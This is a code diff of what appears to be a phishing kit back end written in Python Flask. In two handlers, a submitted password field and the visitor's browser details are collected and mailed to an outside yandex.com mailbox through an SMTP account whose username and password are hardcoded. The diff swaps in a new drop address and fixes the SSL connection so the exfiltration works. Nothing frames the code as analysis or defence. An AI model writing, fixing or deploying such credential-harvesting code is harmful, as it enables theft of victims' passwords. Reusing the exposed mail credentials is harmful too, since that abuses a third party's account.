@@ -178,7 +178,7 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'johnson@maximalmusclelabs.com'
         sender_emaill = 'johnson'
-        receiver_email = 'brown.niker@yandex.com'
+        receiver_email = 'Jinna2323@yandex.com'
         password = 'Dancing2000'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
@@ -198,8 +198,8 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('mail.maximalmusclelabs.com', 465) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL('mail.maximalmusclelabs.com', 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -219,7 +219,7 @@ def second():
         passwordemail = request.form.get('pig')
         sender_email = 'johnson@maximalmusclelabs.com'
         sender_emaill = 'johnson'
-        receiver_email = 'brown.niker@yandex.com'
+        receiver_email = 'Jinna2323@yandex.com'
         password = 'Dancing2000'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
@@ -239,8 +239,8 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('mail.maximalmusclelabs.com', 465) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL('mail.maximalmusclelabs.com', 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
         return redirect(url_for('lasmo'))
